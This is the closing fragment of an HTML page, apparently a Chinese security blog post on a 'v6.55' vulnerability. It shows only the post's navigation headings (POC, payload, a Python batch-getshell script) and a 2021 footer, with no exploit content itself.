                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%89%a7%e8%a1%8c%e7%bb%93%e6%9e%9c">
                            执行结果
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e5%88%86%e6%9e%90%e8%bf%87%e7%a8%8b">
                            分析过程
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%9e%84%e9%80%a0poc">
                            构造POC
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e7%94%a8python%e7%bc%96%e5%86%99%e6%89%b9%e9%87%8fgetshell%e8%84%9a%e6%9c%ac">
                            用Python编写批量Getshell脚本
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#v655%e6%bc%8f%e6%b4%9e%e8%af%a6%e6%83%85">
                            v6.55漏洞详情
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%bc%8f%e6%b4%9e%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c-1">
                            漏洞代码执行
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#payload-1">
                            Payload
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%89%a7%e8%a1%8c%e7%bb%93%e6%9e%9c-1">
                            执行结果
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e5%88%86%e6%9e%90%e8%bf%87%e7%a8%8b-1">
                            分析过程
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%9e%84%e9%80%a0poc-1">
                            构造POC
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e7%94%a8python%e7%bc%96%e5%86%99%e6%89%b9%e9%87%8fgetshell%e8%84%9a%e6%9c%ac-1">
                            用Python编写批量Getshell脚本
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e7%bb%93%e6%9d%9f">
                            结束
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e5%8f%82%e8%80%83">
                            参考
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
